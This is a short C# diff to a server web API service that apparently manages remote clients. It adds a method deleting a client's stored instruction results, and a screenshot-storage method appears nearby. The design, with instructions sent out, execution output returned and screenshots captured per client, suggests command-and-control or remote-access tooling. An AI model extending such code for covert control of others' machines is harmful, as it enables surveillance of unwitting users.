@@ -30,7 +30,11 @@ namespace X_ZIGZAG_SERVER_WEB_API.Services
                 return null;
             }
             return await _context.Results.Where(u => u.ClientId.Equals(uuid)).Select(d => new ResultResponseVM { InstructionId = d.InstructionId, Code = d.Code, ResultDate=d.ResultDate,FunctionArgs=d.FunctionArgs,Output=d.Output }).ToListAsync();
-        }   
+        }
+        public async Task? DeleteAllResponses(string uuid)
+        {
+            await _context.Results.Where(u => u.ClientId.Equals(uuid)).ExecuteDeleteAsync();
+        }
         public async Task StoreScreenshot(string uuid, int Index,long UnixTimeStamp, byte[] imageData)
         {
             var UserSettings = await _context.CheckSettings.Where(u=> u.Id.Equals(uuid)).FirstOrDefaultAsync();
